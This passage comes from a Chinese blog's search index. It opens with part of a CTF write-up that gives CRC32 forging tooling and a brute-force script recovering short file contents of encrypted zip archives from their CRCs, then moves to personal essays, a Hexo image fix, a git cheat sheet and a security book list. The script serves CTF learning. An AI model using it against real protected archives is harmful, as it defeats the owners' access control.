polynomial as reversed (lsbit-first) [default]&#39;) desired_poly_parser = argparse.ArgumentParser(add_help=False) desired_poly_parser.add_argument( &#39;desired&#39;, type=str, help=&#39;[int] desired checksum&#39;) default_poly_parser = argparse.ArgumentParser(add_help=False) default_poly_parser.add_argument( &#39;poly&#39;, default=&#39;0xEDB88320&#39;, type=str, nargs=&#39;?&#39;, help=&#39;[int] polynomial [default: 0xEDB88320]&#39;) accum_parser = argparse.ArgumentParser(add_help=False) accum_parser.add_argument( &#39;accum&#39;, type=str, help=&#39;[int] accumulator (final checksum)&#39;) default_accum_parser = argparse.ArgumentParser(add_help=False) default_accum_parser.add_argument( &#39;accum&#39;, default=&#39;0&#39;, type=str, nargs=&#39;?&#39;, help=&#39;[int] starting accumulator [default: 0]&#39;) outfile_parser = argparse.ArgumentParser(add_help=False) outfile_parser.add_argument(&#39;-o&#39;, &#39;--outfile&#39;, metavar=&quot;f&quot;, type=argparse.FileType(&#39;w&#39;), default=sys.stdout, help=&quot;Output to a file instead of stdout&quot;) infile_parser = argparse.ArgumentParser(add_help=False) subparser_group = infile_parser.add_mutually_exclusive_group() subparser_group.add_argument(&#39;-i&#39;, &#39;--infile&#39;, metavar=&quot;f&quot;, type=argparse.FileType(&#39;rb&#39;), default=sys.stdin, help=&quot;Input from a file instead of stdin&quot;) subparser_group.add_argument(&#39;-s&#39;, &#39;--str&#39;, metavar=&quot;s&quot;, type=str, default=&#39;&#39;, dest=&#39;instr&#39;, help=&quot;Use a string as input&quot;) subparser = subparsers.add_parser(&#39;flip&#39;, parents=[outfile_parser], help=&quot;flip the bits to convert normal(msbit-first) polynomials to reversed (lsbit-first) and vice versa&quot;) subparser.add_argument(&#39;poly&#39;, type=str, help=&#39;[int] polynomial&#39;) subparser.set_defaults( func=lambda: print_num(reverseBits(parse_dword(args.poly)))) subparser = subparsers.add_parser(&#39;reciprocal&#39;, parents=[outfile_parser], help=&quot;find the reciprocal (Koopman notation) of a reversed (lsbit-first) polynomial and vice versa&quot;) subparser.add_argument(&#39;poly&#39;, type=str, help=&#39;[int] polynomial&#39;) subparser.set_defaults(func=reciprocal_callback) subparser = subparsers.add_parser(&#39;table&#39;, parents=[outfile_parser, poly_flip_parser, default_poly_parser], help=&quot;generate a lookup table for a polynomial&quot;) subparser.set_defaults(func=table_callback) subparser = subparsers.add_parser(&#39;reverse&#39;, parents=[ outfile_parser, poly_flip_parser, desired_poly_parser, default_accum_parser, default_poly_parser], help=&quot;find a patch that causes the CRC32 checksum to become a desired value&quot;) subparser.set_defaults(func=reverse_callback) subparser = subparsers.add_parser(&#39;undo&#39;, parents=[ outfile_parser, poly_flip_parser, accum_parser, default_poly_parser, infile_parser], help=&quot;rewind a CRC32 checksum&quot;) subparser.add_argument(&#39;-n&#39;, &#39;--len&#39;, metavar=&#39;l&#39;, type=str, default=&#39;0&#39;, help=&#39;[int] number of bytes to rewind [default: 0]&#39;) subparser.set_defaults(func=undo_callback) subparser = subparsers.add_parser(&#39;calc&#39;, parents=[ outfile_parser, poly_flip_parser, default_accum_parser, default_poly_parser, infile_parser], help=&quot;calculate the CRC32 checksum&quot;) subparser.set_defaults(func=calc_callback) return parser def reciprocal_callback(): poly = parse_dword(args.poly) check32(poly) print_num(reciprocal(poly)) def table_callback(): # initialize tables init_tables(get_poly(), False) # print table out(&#39;[{0}]&#39;.format(&#39;, &#39;.join(map(&#39;0x{0:08x}&#39;.format, table)))) def reverse_callback(): # initialize tables init_tables(get_poly()) # find reverse bytes desired = parse_dword(args.desired) accum = parse_dword(args.accum) # 4-byte patch patches = findReverse(desired, accum) for patch in patches: out(&#39;4 bytes: {{0x{0:02x}, 0x{1:02x}, 0x{2:02x}, 0x{3:02x}}}&#39;.format(*patch)) checksum = calc(patch, accum) out(&#39;verification checksum: 0x{0:08x} ({1})&#39;.format( checksum, &#39;OK&#39; if checksum == desired else &#39;ERROR&#39;)) # 6-byte alphanumeric patches for i in permitted_characters: for j in permitted_characters: patch = [i, j] patches = findReverse(desired, calc(patch, accum)) for last_4_bytes in patches: if all(p in permitted_characters for p in last_4_bytes): patch.extend(last_4_bytes) out(&#39;alternative: {1}{2}{3}{4}{5}{6} ({0})&#39;.format( &#39;OK&#39; if calc(patch, accum) == desired else &#39;ERROR&#39;, *map(chr, patch))) def undo_callback(): # initialize tables init_tables(get_poly()) # calculate checksum accum = parse_dword(args.accum) maxlen = int(args.len, 0) data = get_input() if not 0 &lt; maxlen &lt;= len(data): maxlen = len(data) out(&#39;rewinded {0}/{1} ({2:.2f}%)&#39;.format(maxlen, len(data), maxlen * 100.0 / len(data) if len(data) else 100)) for solution in rewind(accum, data[-maxlen:]): out(&#39;&#39;) print_num(solution) def calc_callback(): # initialize tables init_tables(get_poly(), False) # calculate checksum accum = parse_dword(args.accum) data = get_input() out(&#39;data len: {0}&#39;.format(len(data))) out(&#39;&#39;) print_num(calc(data, accum)) def main(argv=None): &#39;&#39;&#39; Runs the program and handles command line options &#39;&#39;&#39; parser = get_parser() # Parse arguments and run the function global args args = parser.parse_args(argv) args.func() if __name__ == &#39;__main__&#39;: main() # pragma: no cover 示例： 当字节数小于6时，用下面的crack.py脚本（用python3）： #!/usr/bin/env python3 import sys import os import string import collections import argparse parser = argparse.ArgumentParser() parser.add_argument(&#39;file&#39;, nargs=&#39;*&#39;) parser.add_argument(&#39;--hex&#39;, action=&#39;append&#39;) parser.add_argument(&#39;--dec&#39;, action=&#39;append&#39;) parser.add_argument(&#39;--limit&#39;, type=int) parser.add_argument(&#39;--compiler&#39;, default=&#39;g++&#39;) parser.add_argument(&#39;--alphabet&#39;, type=os.fsencode, default=string.printable.encode()) args = parser.parse_args() targets = collections.OrderedDict() limit = 0 crcs = [] if args.limit: limit = max(limit, args.limit) if args.hex or args.dec: if not args.limit: parser.error(&#39;Limit of length not specified&#39;) if args.hex: for s in args.hex: crc = int(s, 16) targets[s] = crc for l in range(args.limit + 1): crcs += [( crc, l )] if args.dec: for s in args.dec: crc = int(s) targets[s] = crc for l in range(args.limit + 1): crcs += [( crc, l )] if args.file: print(&#39;reading zip files...&#39;, file=sys.stderr) import zipfile for zipname in args.file: fh = zipfile.ZipFile(zipname) for info in fh.infolist(): targets[&#39;%s / %s&#39; % ( zipname, info.filename )] = ( info.CRC, info.file_size ) crcs += [( info.CRC, info.file_size )] limit = max(limit, info.file_size) print(&#39;file found: %s / %s: crc = 0x%08x, size = %d&#39; % (zipname, info.filename, info.CRC, info.file_size), file=sys.stderr) if not crcs: parser.error(&#39;No CRCs given&#39;) # compiling c++ in python script is the easy way to have the both a good interface and better speed code = &#39;&#39; code += r&#39;&#39;&#39; #include &lt;cstdio&gt; #include &lt;vector&gt; #include &lt;array&gt; #include &lt;string&gt; #include &lt;set&gt; #include &lt;cstdint&gt; #include &lt;cctype&gt; #define repeat(i,n) for (int i = 0; (i) &lt; (n); ++(i)) using namespace std; uint32_t crc_table[256]; void make_crc_table() { repeat (i, 256) { uint32_t c = i; repeat (j, 8) { c = (c &amp; 1) ? (0xedb88320 ^ (c &gt;&gt; 1)) : (c &gt;&gt; 1); } crc_table[i] = c; } } const uint32_t initial_crc32 = 0xffffffff; uint32_t next_crc32(uint32_t c, char b) { return crc_table[(c ^ b) &amp; 0xff] ^ (c &gt;&gt; 8); } const uint32_t mask_crc32 = 0xffffffff; const char alphabet[] = { &#39;&#39;&#39; + &#39;, &#39;.join(map(str, args.alphabet)) + r&#39;&#39;&#39; }; const int limit = &#39;&#39;&#39; + str(limit) + r&#39;&#39;&#39;; array&lt;set&lt;uint32_t&gt;, limit+1&gt; crcs; string stk; void dfs(uint32_t crc) { if (crcs[stk.length()].count(crc ^ mask_crc32)) { fprintf(stderr, &quot;crc found: 0x%08x: \\&quot;&quot;, crc ^ mask_crc32); for (char c : stk) fprintf(stderr, isprint(c) &amp;&amp; (c != &#39;\\\\&#39;) ? &quot;%c&quot; : &quot;\\\\x%02x&quot;, c); fprintf(stderr, &quot;\\&quot;\\n&quot;); printf(&quot;%08x &quot;, crc ^ mask_crc32); for (char c : stk) printf(&quot; %02x&quot;, c); printf(&quot;\\n&quot;); } if (stk.length() &lt; limit) { for (char c : alphabet) { stk.push_back(c); dfs(next_crc32(crc, c)); stk.pop_back(); } } } int main() { &#39;&#39;&#39; for crc, size in crcs: code += &#39; crcs[&#39; + str(size) + &#39;].insert(&#39; + hex(crc) + &#39;);\\n&#39; code += r&#39;&#39;&#39; make_crc_table(); dfs(initial_crc32); return 0; } &#39;&#39;&#39; import tempfile import subprocess with tempfile.TemporaryDirectory() as tmpdir: cppname = os.path.join(tmpdir, &#39;a.cpp&#39;) with open(cppname, &#39;w&#39;) as fh: fh.write(code) binname = os.path.join(tmpdir, &#39;a.out&#39;) print(&#39;compiling...&#39;, file=sys.stderr) p = subprocess.check_call([args.compiler, &#39;-std=c++11&#39;, &#39;-O3&#39;, &#39;-o&#39;, binname, cppname]) print(&#39;searching...&#39;, file=sys.stderr) p = subprocess.Popen([binname], stdout=subprocess.PIPE) output, _ = p.communicate() print(&#39;done&#39;, file=sys.stderr) print(file=sys.stderr) result = collections.defaultdict(list) for line in output.decode().strip().split(&#39;\\n&#39;): crc, *val = map(lambda x: int(x, 16), line.split()) result[( crc, len(val) )] += [ bytes(val) ] for key, crc in targets.items(): for s in result[crc]: print(&#39;%s : %s&#39; % (key, repr(s)[1:])) 示例： 0x06 MORE还有很多压缩包的密码需要联系题中的其他文件来解，这个就不在本篇的讨论范围内了，故不再讨论。","tags":[{"name":"CTF","slug":"CTF","permalink":"https://blog.cyris.cn/tags/CTF/"}]},{"title":"觉得理性的人快乐吗","date":"2017-07-12T12:34:52.000Z","path":"posts/the-seed/","text":"只是你不知道我的狂野。 一、靠在窗外的人 读着窗边的景初中高中的时候经常会在空间或者朋友圈发些简短的话，诸如“不是雪晚了，只是年早了（记某次终于到来的雪，很兴奋，看了以往的日历才发现，是那年年过得早，所以才有雪来得迟的感受）”，“把书夹在光里（第一次见到那种夹子式的移动台灯的时候，把它夹在了硬皮书上然后靠在床前阅读）”，类似的还有很多，似乎变成了动态圈的一股清流，也不求多少赞，不想多少评论，只是想说，就说了。（那时候也不会想到这些话会成为水母喜欢自己的一部分理由）。现在很少发朋友圈之类的，主要是多了些可以说话的人吧，表达的对象与地方都发生了些改变。当然不同的人会采取不同的表达方式，所以衍生出了各种各样的圈子，过得开心即可。 每个阶段的“回家”都是有不同的意义的。 其实一直很羡慕有弟弟妹妹的人，大概是“独生”带来的某种程度的孤独感太过真实了吧。于是可以说话的“人”，从小时候的玩具，到游戏里的熟人，到窗外的天空，云与太阳，到曾经觉得会合不来现在却无话不说的挚友，到水母玲，每个阶段都有独到的故事在。 这里没有提到父母或者各类长辈，不清楚其他家的情况所以不作大体的评价，不过对于我自己，其实在物质得到一定的满足之后，会转而追求一些精神上的东西，而这些是更偏向物质追求的那一代很难给予的，他们会以经验，以自己的想法告诉你，应该怎么去做，家长，孩子，男人，女人，这些的区别在他们的眼里有时候太过强烈了，以致于你做了一件你想做的事可能会被说，你不能这么做，你是男孩子所以要强硬不能柔软，你是女孩子所以不要经常出去玩，你是小孩不要听我们讲话，不要管大人的事，专心读书就好，之类，（这样看来女装反而是一种思想的解放呢hh）就比如不管大人的事，其实孩子很聪明，学语言的速度就比大人快上很多，这样的学习能力，以“大人的事”来限制一些思想的开拓，其实觉得挺可惜的（也算是之后很长一段时间不太爱和他们说话的原因吧）。 以前会觉得不舒服，会闹脾气，随意得不理他们，一是确实不喜欢一些做法和说法，二是前一段时间才想到的，可能觉得无论自己怎么耍性子他们都不会离开自己丢下自己，所以潜意识里助长了一些任性呢。好在自己也是个比较平静的人，不会太过生气，不会太过任性，即使偶尔有些意见的争执，不是无意义的大吵大闹就可以接受。以及，他们确实是爱着自己关心着自己的 —— 以他们自己的方式。虽然作为一个个体，我们拥有管理自己的情绪和释放自己属性的权利 —— 只是合适不合适的问题。比较“妥善”的释放，不仅可以最大限度地解压，也是一种成熟的体现吧。学会控制是门艺术，它不是对自己的压抑，反而是种引导式的增益。 对自己也好，对其他关心甚至爱着自己的人也好。 靠在窗外的人，读着窗边的景。 搬到新家以后，会经常靠在客厅的窗边看着窗外的天。没有任何建筑的遮挡，视野获得了最大程度的自由。会觉得离天空很近，离太阳很近，离风很近，离云很近，离飞鸟很近，离生命很近。他们每天走着不一样的轨迹，但却丰满而深刻。拍了很多这个位置这个视角下的照片，每一张都不一样，情理之中。不过这里不是说景色的搭配不一样，而是他们所展现的力量，是色彩的灵活搭配下深度展现给我，带给我震撼感的东西。 天空是会说话的，如果你用心说，如果你用心听。那段日子，虽然大人们看来是“很无聊的发呆”，自己却觉得是意外的充实与滋润。 二、交心前段时间回归了一下以前玩过的一款游戏，果然还是热爱着RPG呢。因为剧情和地图人设都觉得做得不错，就安利给了女友，一起玩了会儿，也算是了了一个心愿呢。惊喜的是她也很喜欢这款游戏，不过随着等级的上升，遇到使用第三方插件的玩家越来越多，不对，不应该称作玩家，而是商人吧。抢占着地图与道具，把正常玩家挤下线，并严重阻碍着任务的完成度。 这是款冷了很久的游戏，当初退出它就是因为过分的商业化，而代理商并没有解决问题的力量，不如说不愿去解决吧。吃相并不好看。好好的游戏体验，只能在回忆里体验到了。即使喜欢着游戏本身，女友也因为受不了这点，不出几日便删了游戏。有太多的脏话想说。然而该说的几年前就说了，现在能找到一些记忆里的体验就已经很棒了。 除了这款游戏，还有的比较深印象的是初中的时候逛着贴吧找到了[异次元服务器]，一个用服务器搭着MC进行游戏的小圈子。以前觉得弄服务器什么的很厉害，但是后来才知道其中大部分人是比自己还小的，也更说明了孩子的学习能力的强力呢。当然我在这里想说的不是游戏的体验，而是一些其他的东西。一起玩过游戏的人，有的已经结婚生子，有的还在积极备考，有的是和自己一样或者相似的人。很多人可能都没有见过面，但是现在还有着一些联系，很感动。在这种充斥着不信任的时代里，这种温暖显得难得可贵，即使隔着屏幕，也能感受到一些亲和。 我称这种体验为交心。 当然离我们更近的交心体验还是朋友间，恋人间的。嗯也借这个机会谈谈一些恋爱观与设想吧。 其实成长到现在，不仅是自己，整个社会的恋爱观都在发生着变化，从以前的连靠得很近都觉得是种羞耻的时代到了可以大胆去表达，表现爱的时代，觉得也是种进步呢，也是种解放。年轻人们有着自己的方式与理解去决定如何去爱，最主要的是如何去选择对象与对自己身体的开放程度，比如现在的勾肩搭背搂抱可能是以前的人所无法接受的呢。当然远不止这些。 这些概括起来大致是[选择权]的提升吧，说起来本该拥有的东西现在被赋予了或者说争取到了还觉得开心，其实有点奇怪的呢。 这世界，两个人，能相遇，不容易。 当谈及恋爱的时候，我觉得不管是在哪个年龄，都不该含着一种羞耻心，最常见的就是你比邻居家的某个哥哥姐姐要早有男票女票，你的爸妈可能会觉得有某种“不妥”，甚至对方到家里来玩都要遮遮掩掩不好意思，这本身就有一种不合理的成分在。爱的经营好比商业，甚至比经商还要复杂，那么人们是否会因为你年纪轻轻比周围的中年工作党还赚得多而感到羞耻嘛？显然不会，他们还会夸这样的你。那么为什么放到恋爱这边会有这样的差别呢，其实还是一种物质世界与精神世界的搭配不均，或者说某种传统的偏见束缚所引起的，那么爱与性的解放，其实还有很长一段路要走。我们所关注的，应该是如何去引导自己或者自己的孩子，去提升整场感情的质量，而非冠冕的“为了你好以xx为重不能这样不能这样”，这是种压制，而非利于他成长的体验。 有幸捕捉到一只有相近目标的女票，并不会觉得将来会因为专业的重合而使得乐趣与圈子重合而造成乐趣的减少，当然下一章任务的解锁与成就的体验会需要现在的一些努力与投入，听起来有点教条，但还是这个理呢XD。你没办法说，现在靠着家长享受着一些东西，以后也可以这样。无济于事可能来自于自己的无能为力，这种感觉会非常痛苦。 长久的陪伴融合并不是让一个人去迁就另一个人，可能很多男生会觉得一直哄一直宠着女票就可以，很多人觉得以后肯定会这么做，然而这其实不是健康的感情，爱是双向的，你的温柔与包容是必须的，但是同时你吸引对方的，一定不是如何宠溺，而是你本身。带给她无限关怀的可能不止你一个人能做到，但是要牢牢得用自身去吸引她的，只有你能做到。如果对方一直没有什么亮点的话，你会觉得各种对自己的好都显得那么普通，而如果是不断吸引着自己的人呢，其实稍微对你的注意与关怀都会感觉像是上帝的恩赐一般，甚至整天的心情都是那么棒。 可以在做着不一样的事，可以有着不同认识的人，但是你会成为她的住所，会是她愿意回来且能感到安心的地方，你们之间可以有抱怨，但是没有猜疑；可以有嫌弃，但也有迷人的部分，仅此一人。每天重复着一样的动作，仅仅是吃饭睡觉一起上课，会显得疲倦，于是可以尝试着加些创意，因为有她，你有源源不断的点子，因为是她，所以你愿意去投入一定的时间去准备这些小惊喜，而在属于自己的时间，最大效率地完成学习，完成工作，成就自己。去打造深化自己拥有的也不断吸引着她的优点，去增强自己的能力以去更好地守护她，守护这段感情，守护自己。这个过程不会简单，其中必定会有不理解与小委屈，但是只要面对着对方的是真实的内心，这些都很容易解决。 也希望自己能够成长为可以独挡一面，成熟的人。 祝愿，祝福。 以上。","tags":[{"name":"煮字","slug":"煮字","permalink":"https://blog.cyris.cn/tags/煮字/"}]},{"title":"Hexo 博客图片问题解决办法","date":"2017-07-12T11:46:06.000Z","path":"posts/blog-picture-issue/","text":"关于hexo博客图片无法正常显示的问题的解决办法。 之前一直用的MarkdownPad2自带的添加图片按钮来添加图片（存储在hexo/source/imag里），但是经常会有显示不出的情况，不喜欢用各大图床，于是查了一波本地存储上传的方法，找到了一个插件来修正img标签以使图片正常显示。 参考自简书。 0x01 Asset设定确认首先确认_config.yml 中有 post_asset_folder:true。这时候每次hexo new会自动建立一个与文章同名的文件夹，我们可以把与该文章相关的所有资源都放到那个文件夹，来更方便得调用资源。 0x02 插件添加在hexo文件夹执行： npm install https://github.com/CodeFalling/hexo-asset-image –save 0x03 图片添加完成安装后新建一个文件试试，发现在.md文件同级目录下会有一个同名文件夹。比如我们新建了一个文件blog-picture-issue.md，然后在同名文件夹里放张图：1.png。 之后在原图片引用语句的括号里写入： blog-picture-issue/1.PNG 就能看到正常显示的图片了： 注：[]里是图片的名称，可不写。 0x04 issued这样的操作以后生成的html是： &lt;img src=&quot;/2017/07/12/blog-picture-issue/1.PNG&quot; alt=&quot;logo&quot;&gt; 而非之前的： &lt;img src=&quot;blog-picture-issue/1.PNG&quot; alt=&quot;logo&quot;&gt;” 使得图片正常显示。","tags":[{"name":"HEXO","slug":"HEXO","permalink":"https://blog.cyris.cn/tags/HEXO/"}]},{"title":"菠萝牛肉饭","date":"2017-07-02T03:54:20.000Z","path":"posts/tea-maker/","text":"菠萝，青菜，牛肉，米饭，芝麻，番茄蛋汤。 一、番茄蛋汤精灵挺喜欢香港岛的老板的，一个带点广东口音的大叔，店里有鱼有猫，靠近门口的地方有张小桌子，上面堆了些有种年代意象的玩物，平时戴着细框眼镜，很是友好，买单时会跟你说谢谢，很平静的那种，静到直深心骨，声音有种大漠般的饱满，总之光那几声谢谢，也会再一次进店享食。 在这里用餐还是挺奢侈的，两个人可以吃到50+，但是东西量很足，第一次来点菜难免会浪费，量足的同时味也很足，整个店都有老板的那种气质，印象比较深的便是那份菠萝牛肉饭，汁液包裹着菠萝青菜与牛肉，这些食材的味道又锁在了汤汁里，交错相关，很是融洽。米饭虽也在一个盘子里却保持着很难得的干净，夫人会很喜欢这样的米饭，有着它该有的独立剔透的味道。我比较喜欢喝汤，所以这份饭到最后基本会被我用汤汁浇淋全身，米香即被困在了一层透明丝滑之下。吃得很愉快。老板娘还很贴心的送了份番茄蛋汤，味道也很出色。说到番茄蛋汤，不得不提一下番茄蛋汤精灵@Acaleph，靠一碗汤就可以让我吃完一顿饭的水母宝贝。 “成为优秀厨师的诀窍就是…遇上一个足以让你想要将自己所有的料理，都献给她的女人。” —— 食戟之灵 最早来这里是橙子介绍的，喝的生滚粥，肉片煮得很有力度，量也很够，一份粥两个人也可以吃饱。里边还有几片生菜，妖娆得躺在粥里，忍不住想揪出来咬几口。生滚粥当然主要品的是粥啦，粥也是很棒，记得连续吃了好几天，它与盛放它的黑色砂锅有着相近的味道，也表现着老板的那种气质——饱满沧桑却近人有力。 在这里，食物有着它该有的味道。在吃腻了外卖的那种干燥后，很长一段时间胃口处于闭塞的状态，偶然点的一份菠萝牛肉饭，解锁了一些新的体验。 二、点亮宿舍的柠檬由随手翻倒的满杯的柠檬绿茶所释放的意象怪物。 某家店的饮品里常常会放入大只的果块果片，基本啃完了水果茶水也就剩下一点，放了冰块的东西得趁冷喝，热了化了淡了，这杯饮品迷人的地方就少了，那种有点先前的调味但是又掺杂着融化的人工冰块的塑料味的东西，不是很能接受，以后也不会。 急着开电脑打翻了杯刚买的柠檬茶，不开心，其实最近遇到了很多不顺心的事，知道要去调整，却惰于烦躁与抱怨。倒翻的绿茶很无意地点亮了这个地方，擦干地面的时候，有很舒服的味道充盈着这间屋子，降温消燥，忙着期末考好久未拖的地，也趁着这个机会干净了一把。 不会喜欢鸡汤类的东西，并不是那么适合大部分人，有时候还会变成强扭某种境遇的措辞，看着不是很舒服。当然翻倒的柠檬水的清香是真，这个体验是真实存在的，也的确愉悦了一会儿，再过一会儿味道没了，便又回到了一股燥热中。以及地面似乎没拖干净，黏，乎，乎……","tags":[{"name":"煮字","slug":"煮字","permalink":"https://blog.cyris.cn/tags/煮字/"}]},{"title":"GIT 时光机","date":"2017-05-12T16:17:27.000Z","path":"posts/git/","text":"Ak师傅的小灶上谈了些关于git的常见用法，回去以后做了些整理。 参考链接： Aklis写的wiki阮一峰的git教程廖雪峰的git教程 一、时光机硬件说明书 Workspace： 工作区 Index / Stage： 暂存区 Repository： 本地仓库 Remote： 远程仓库 HEAD： 当前分支 Commit history： 历史记录 0X01 零件组装这里有三种情况： 1. 在当前目录新建一个Git代码库(如果是要使用github上的库，需要先pull下来，不然无法 push到目标库，这里的第三种方法就可以。) $ git init 2. 新建目录，将其初始化为Git仓库 $ git init project-name 3. pull下来一个项目与其代码历史 $ git clone URL 0X02 时光机的配置Git有个设置文件.gitconfig，它可以全局配置，也可以项目配置。 1.显示当前的Git配置 $ git config --list 2.编辑Git配置文件 $ git config -e [--global] 3.设置提交代码时的用户信息 $ git config [--global] user.name &quot;name&quot; $ git config [--global] user.email &quot;email address&quot; 0X03 在时光机上注入add钙奶 1.添加指定文件到暂存区 $ git add file1 file2 ... 2.添加指定目录到暂存区（包括其中的子目录） $ git add dir（文件夹名称） 3.添加当前目录所有文件到暂存区 $ git add . 4.分次提交 $ git add -p 5.删除工作区文件，并且把这次删除放入暂存区 $ git rm file1 file2 ... 6.停止追踪指定文件（该文件会保留在工作区） $ git rm --cached file 7.改名文件，然后把这个改名文件放入暂存区 $ git mv file-original file-renamed 0X04 挪挪挪，挪进仓库 1.提交暂存区到仓库区 $ git commit -m &quot;message&quot; 2.提交暂存区指定文件到仓库区 $ git commit file1 file2 ... -m &quot;message&quot; 3.提交工作区自上次commit之后的变化，直接到仓库区 $ git commit -a 4.提交时显示所有diff信息 $ git commit -v 5.使用一次新的commit，替代上一次提交。如果代码没有任何新变化，则用来改写上一次commit的提交信息 $ git commit --amend -m &quot;message&quot; 6.重做上一次commit，并包括指定文件的新变化 $ git commit --amend file1 file2 ... 0X05 时光机分机 1.列出所有本地分支 $ git branch 2.列出所有远程分支 $ git branch -r 3.列出所有本地分支和远程分支 $ git branch -a 4.新建一个分支，但依然停留在当前分支 $ git branch [branch-name] 5.新建一个分支，并切换到该分支 $ git checkout -b [branch] 6.新建一个分支，指向指定commit $ git branch [branch] [commit] 7.新建一个分支，与指定的远程分支建立追踪关系 $ git branch --track [branch] [remote-branch] 8.切换到指定分支，并更新工作区 $ git checkout [branch-name] 9.切换到上一个分支 $ git checkout - 10.建立追踪关系，在现有分支与指定的远程分支之间 $ git branch --set-upstream [branch] [remote-branch] 11.合并指定分支到当前分支 $ git merge [branch] 12.选择一个commit，合并进当前分支 $ git cherry-pick [commit] 13.删除分支 $ git branch -d [branch-name] 14.删除远程分支 $ git push origin --delete [branch-name] $ git branch -dr [remote/branch] 0X06 Tag 1.列出所有tag $ git tag 2.新建一个tag在当前commit $ git tag [tag] 3.新建一个tag在指定commit $ git tag [tag] [commit] 4.删除本地tag $ git tag -d [tag] 5.删除远程tag $ git push origin :refs/tags/[tagName] 6.查看tag信息 $ git show [tag] 7.提交指定tag $ git push [remote] [tag] 8.提交所有tag $ git push [remote] --tags 9.新建一个分支，指向某个tag $ git checkout -b [branch] [tag] 0X07 信息查看 1.显示有变更的文件 $ git status 2.显示当前分支的版本历史 $ git log 3.显示commit历史，以及每次commit发生变更的文件 $ git log --stat 4.搜索提交历史，根据关键词 $ git log -S [keyword] 5.显示某个commit之后的所有变动，每个commit占据一行 $ git log [tag] HEAD --pretty=format:%s 6.显示某个commit之后的所有变动，其&quot;提交说明&quot;必须符合搜索条件 $ git log [tag] HEAD --grep feature 7.显示某个文件的版本历史，包括文件改名 $ git log --follow [file] $ git whatchanged [file] 8.显示指定文件相关的每一次diff $ git log -p [file] 9.显示过去5次提交 $ git log -5 --pretty --oneline 10.显示所有提交过的用户，按提交次数排序 $ git shortlog -sn 11.显示指定文件是什么人在什么时间修改过 $ git blame [file] 12.显示暂存区和工作区的差异 $ git diff 13.显示暂存区和上一个commit的差异 $ git diff --cached [file] 14.显示工作区与当前分支最新commit之间的差异 $ git diff HEAD 15.显示两次提交之间的差异 $ git diff [first-branch]...[second-branch] 16.显示今天你写了多少行代码 $ git diff --shortstat &quot;@{0 day ago}&quot; 17.显示某次提交的元数据和内容变化 $ git show [commit] 18.显示某次提交发生变化的文件 $ git show --name-only [commit] 19.显示某次提交时，某个文件的内容 $ git show [commit]:[filename] 20.显示当前分支的最近几次提交 $ git reflog 0X08 远程同步篇 1.下载远程仓库的所有变动 $ git fetch [remote] 2.显示所有远程仓库 $ git remote -v 3.显示某个远程仓库的信息 $ git remote show [remote] 4.增加一个新的远程仓库，并命名 $ git remote add [shortname] [url] 5.取回远程仓库的变化，并与本地分支合并 $ git pull [remote] [branch] 6.上传本地指定分支到远程仓库 $ git push [remote] [branch] 7.强行推送当前分支到远程仓库，即使有冲突 $ git push [remote] --force 8.推送所有分支到远程仓库 $ git push [remote] --all 0X09 时光回溯篇 1.恢复暂存区的指定文件到工作区 $ git checkout [file] 2.恢复某个commit的指定文件到暂存区和工作区 $ git checkout [commit] [file] 3.恢复暂存区的所有文件到工作区 $ git checkout . 4.重置暂存区的指定文件，与上一次commit保持一致，但工作区不变 $ git reset [file] 5.重置暂存区与工作区，与上一次commit保持一致 $ git reset --hard 6.重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变 $ git reset [commit] 7.重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致 $ git reset --hard [commit] 8.重置当前HEAD为指定commit，但保持暂存区和工作区不变 $ git reset --keep [commit] 9.新建一个commit，用来撤销指定commit，后者的所有变化都将被前者抵消，并且应用到当前分支 $ git revert [commit] 10.暂时将未提交的变化移除，稍后再移入 $ git stash $ git stash pop 二、Github与信仰 这个周目是关于Linux下git时光机的实际应用 —— 把已有项目推到Github上。 Github账号的创建与git的安装配置不再作说明。 1X01 设置Git设置用户名与email： git config --global user.name &quot;your name&quot; git config --global user.email &quot;youremail@lalala.com&quot; 此时在/home下会新建一个.gitconfig文件 1X02 配置SSH1.创建SSH Key $ ssh-keygen -t rsa -C &quot;youremail@lalala.com&quot; 系统会提示key的保存位置，一般为~/.ssh，接下来会请求输入口令，一路默认，敲三次回车即可。 然后登陆gayhub -&gt; Accounting settings -&gt; SSH key -&gt; Add SSH Key -&gt; 取个容易区分的名字 -&gt; 把~/.ssh/id_rsa.pub文件中的内容粘贴上去即可。 用下面的命令进行测试： ssh -T git@github.com 1X03 push and pull from github1.在新建的~/My_Message_Board目录中git clone已存在GitHub上的Repository git clone URL 2.先修改个readme，提交。 sudo vi README.md git status git add README.md git status git commit -m &quot;Cyris readme-change 5/17&quot; git status git remote add origin URL 报了个错： fatal: remote origin already exists. 解决方法： $ git remote rm origin 再来。 $ git remote add origin URL（这些URL都是github里复制的URL） 3.下面把它push上去 $ git push -u origin master 这里会要求输入GitHub账户的用户名和密码。输入即可。 4.提交完成，去GitHub看眼Repository。内容修改成功。","tags":[{"name":"GIT","slug":"GIT","permalink":"https://blog.cyris.cn/tags/GIT/"},{"name":"Wiki","slug":"Wiki","permalink":"https://blog.cyris.cn/tags/Wiki/"}]},{"title":"魔法禁书目录","date":"2017-04-15T01:38:00.000Z","path":"posts/wiki/","text":"vidar team整理的一份推荐书单，各个方向各个阶段均有。 推荐图书目录渗透方向：· 基础类&#160; &#160; &#160; &#160;《PHP基础教程.第4版》&#160; &#160; &#160; &#160;《PHP与MySQL权威指南》&#160; &#160; &#160; &#160;《Javascript权威指南》&#160; &#160; &#160; &#160;《Python基础教程》&#160; &#160; &#160; &#160;《Python 网络编程》&#160; &#160; &#160; &#160;《TCP/IP协议详解 三卷》&#160; &#160; &#160; &#160;《图解TCP/IP》&#160; &#160; &#160; &#160;《HTTP权威指南》&#160; &#160; &#160; &#160;《图解HTTP》&#160; &#160; &#160; &#160;《HTTP协议详解》&#160; &#160; &#160; &#160;《Python绝技：运用Python成为顶级黑客》 · 攻防类&#160; &#160; &#160; &#160;《白帽子讲WEB安全》&#160; &#160; &#160; &#160;《Web前端 黑客技术揭秘》&#160; &#160; &#160; &#160;《Kali Linux Web 渗透测试》&#160; &#160; &#160; &#160;《黑客攻防技术宝典Web实战篇》&#160; &#160; &#160; &#160;《SQL注入攻击与防御》&#160; &#160; &#160; &#160;《XSS跨站脚本攻击剖析与防御》&#160; &#160; &#160; &#160;《安全参考系列》&#160; &#160; &#160; &#160;《Python黑帽子：黑客与渗透测试编程之道》 逆向方向：· 基础类（建议按顺序学习）&#160; &#160; &#160; &#160;《汇编语言》&#160; &#160; 